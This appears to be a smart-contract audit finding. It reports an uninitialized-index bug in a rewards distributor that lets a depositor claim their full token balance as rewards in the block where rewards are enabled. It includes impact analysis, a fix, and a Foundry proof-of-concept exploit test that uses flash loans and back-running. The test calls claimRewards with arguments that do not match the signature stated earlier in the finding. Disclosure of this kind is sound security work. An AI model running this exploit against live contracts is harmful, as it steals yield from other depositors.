### Title
Uninitialized `accountIndexOf` read as zero lets a depositor claim rewards equal to their full token balance when a reward token's index is still `INITIAL_INDEX` - (File: contracts/RewardsDistributor.sol)

### Summary
`RewardsDistributor._calculateTokenDelta` only applies the `INITIAL_INDEX` fallback for a never-recorded account (`accountIndexOf[token][account] == 0`) when the token index is strictly greater than `INITIAL_INDEX`. When a newly incentivized DepositToken/DebtToken still sits at `index == INITIAL_INDEX` (the block in which `updateTokenSpeed(s)` enables it, before any accrual call advances the index), the delta index becomes `INITIAL_INDEX - 0 = 1e18`, so `_tokensDelta = balanceOf(account).wadMul(1e18) == balanceOf(account)`. Any unprivileged user can then call `claimRewards` and drain reward tokens up to their deposit/debt token balance, stealing yield reserved for all other users.

### Finding Description
In `_calculateTokenDelta` (contracts/RewardsDistributor.sol:217-231):

```solidity
_tokenIndex = _tokenState.index;
uint256 _accountIndex = accountIndexOf[token_][account_];

if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX) {
    _accountIndex = INITIAL_INDEX;
}

uint256 _deltaIndex = _tokenIndex - _accountIndex;
_tokensDelta = token_.balanceOf(account_).wadMul(_deltaIndex);
```

The fallback guards only the `_tokenIndex > INITIAL_INDEX` case. `_updateTokenSpeed` initializes a new reward token with `TokenState({index: INITIAL_INDEX, timestamp: block.timestamp})` (line 298). In the same block, `_calculateTokenIndex` computes `_deltaTimestamps == 0`, so `_updateTokenIndex` performs no update and the index remains `INITIAL_INDEX` (lines 202-211). A call to the permissionless `updateBeforeMintOrBurn(token_, attacker_)` (line 175, explicitly "may be called by anyone") then runs `_updateTokensAccruedOf` with `_accountIndex == 0` and `_tokenIndex == INITIAL_INDEX`, producing `_tokensDelta = attacker balance`.

`claimRewards(address[] accounts, IERC20[] tokens)` (line 150) is also permissionless and settles `tokensAccruedOf` via `_transferRewardIfEnoughTokens`, transferring `rewardToken` whenever the amount fits the distributor balance (lines 248-255).

### Impact Explanation
The attacker mints or flash-borrows a large DepositToken/DebtToken position, back-runs the governor's `updateTokenSpeeds` transaction in the same block (identical `block.timestamp`, so the index cannot advance), calls `updateBeforeMintOrBurn(token_, attacker)` to accrue `balanceOf(attacker)` reward units, then calls `claimRewards` to receive `min(attackerBalance, distributorBalance)` of `rewardToken`. This is direct theft of unclaimed yield belonging to every other depositor/borrower. Using flash liquidity plus `SmartFarmingManager.leverage`-style balance inflation, a single attack can approach draining the distributor's entire `rewardToken` balance; multiple accounts/tokens remove the per-balance cap entirely.

### Likelihood Explanation
- `updateBeforeMintOrBurn` and `claimRewards` have no access control, no `onlyIfTokenExists`, and no pausability gate.
- The only precondition is `tokenStates[token].index == INITIAL_INDEX` with `tokenSpeeds[token] > 0`, which deterministically holds in the block where the governor enables rewards for a token (and persists whenever speed > 0 but no index-updating call has landed yet in a block where a fast attacker acts first).
- Attacker needs a deposit/debt token balance, obtainable same-transaction via flash loan → `Pool.deposit` (or borrow) → attack → withdraw → repay, since `DepositToken`/`DebtToken` mint hooks merely call back into this same function.

### Recommendation
In `_calculateTokenDelta`, treat `accountIndexOf == 0` as `INITIAL_INDEX` whenever `_tokenIndex >= INITIAL_INDEX` (i.e., drop the strict `>`), or initialize `accountIndexOf` to the current index on first touch. This makes the zero-slot state represent "accrued from index 0" never reachable, matching the intended semantics that a new account starts accruing from the current index.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {RewardsDistributor} from "contracts/RewardsDistributor.sol";
import {IERC20} from "contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {IPool} from "contracts/interfaces/IPool.sol";
import {IDepositToken} from "contracts/interfaces/IDepositToken.sol";

// Fork test: mainnet, block after RewardsDistributor + a Pool with a DepositToken are live.
contract UninitializedIndexTest is Test {
    RewardsDistributor distributor = RewardsDistributor(<REWARDS_DISTRIBUTOR>);
    IPool pool = IPool(<POOL>);
    IDepositToken depositToken = IDepositToken(<DEPOSIT_TOKEN>); // underlying e.g. a Vesper/Meta token
    IERC20 underlying = IERC20(<UNDERLYING>);
    address governor = <GOVERNOR>;

    function test_claimsBalanceAsReward_sameBlockAsSpeedEnabled() public {
        address attacker = makeAddr("attacker");

        // 1) Attacker obtains a DepositToken balance (flash-loanable; shown via deal)
        uint256 depositAmount = 500_000e18;
        deal(address(underlying), attacker, depositAmount);
        vm.startPrank(attacker);
        underlying.approve(address(depositToken), type(uint256).max);
        depositToken.mint(depositAmount); // or pool.deposit path
        vm.stopPrank();
        uint256 bal = depositToken.balanceOf(attacker);
        assertGt(bal, 0);

        // 2) Same block: governor enables rewards for this token
        IERC20[] memory t = new IERC20[](1); t[0] = IERC20(address(depositToken));
        uint256[] memory s = new uint256[](1); s[0] = 1e18;
        vm.prank(governor);
        distributor.updateTokenSpeeds(t, s);   // sets index = INITIAL_INDEX, timestamp = now

        // 3) Same timestamp: index cannot advance -> attacker back-runs in the same block
        vm.prank(attacker);
        distributor.updateBeforeMintOrBurn(IERC20(address(depositToken)), attacker);
        // _accountIndex == 0, _tokenIndex == INITIAL_INDEX -> delta = bal * 1e18 / 1e18 = bal
        assertEq(distributor.tokensAccruedOf(attacker), bal);

        // 4) Claim drains rewardToken up to distributor balance
        uint256 rewardBal = IERC20(distributor.rewardToken()).balanceOf(address(distributor));
        vm.prank(attacker);
        distributor.claimRewards(attacker, t);
        assertEq(IERC20(distributor.rewardToken()).balanceOf(attacker), bal < rewardBal ? bal : rewardBal);
    }
}
```

Run with `forge test --fork-url <mainnet-rpc> --match-test test_claimsBalanceAsReward_sameBlockAsSpeedEnabled`.
